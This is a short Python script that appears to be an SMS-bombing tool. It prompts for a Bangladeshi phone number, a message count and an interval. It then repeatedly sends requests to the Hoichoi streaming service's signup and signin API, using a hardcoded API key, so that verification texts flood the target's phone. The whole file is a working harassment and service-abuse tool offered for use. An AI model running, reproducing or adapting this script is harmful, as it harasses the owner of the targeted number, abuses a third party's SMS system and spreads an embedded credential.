#/usr/bin/env python3

import requests as rq
from time import sleep
from jadu import jadu

def hoichoi(number):
  header = {
    'Host': 'prod-api.viewlift.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json;charset=utf-8',
    'Content-Length': '130',
    'x-api-key': 'dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3',
    'Origin': 'https://www.hoichoi.tv',
    'Referer': 'https://www.hoichoi.tv/viewplans',
    'Connection': 'close'
  }

  data = {
    "requestType": "send",
    "phoneNumber": "+88" + number,
    "emailConsent": "false",
    "whatsappConsent": "true",
    "email": "pacoj36406@geeky83.com"
  }

  url = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'
  res = rq.post(url=url, json=data, headers=header)
  if res.json().get("code"):
    data = {"requestType":"send","phoneNumber":"+88"+number,"screenName":"signin"}
    url = 'https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-909a8beb-3a2a-16e6-788d-b9d093d5d640'
    res = rq.post(url=url, json=data, headers=header)
  # print(res.json())
  return res

def main():
  number = str(input("[>] Enter Phone Number: "))
  amount = int(input("[>] Enter SMS Ammount: "))
  interval = int(input("[>] Enter SMS Sent Time Interval: "))
  sent, nsent, count = 0, 0, 0
  jadu(number, amount)
  for count in range(1, amount + 1):
    try:
      status = hoichoi(number).status_code
      if status == 200:
        sent += 1
        print(f"[✓] {count} SMS Sent 😉")
        sleep(interval)
    except:
        print(f"[×] {count} SMS Not Sent.")
        sleep(1)
    
    count+=1

  totalhit  = amount
  nsent     = totalhit - sent

  print(f"[•] Hits : {totalhit} 😉")
  print(f"[✓] Sent : {sent} 🙃")
  print(f"[×] Not Sent : {nsent} 😒")

if __name__ == "__main__":
  main()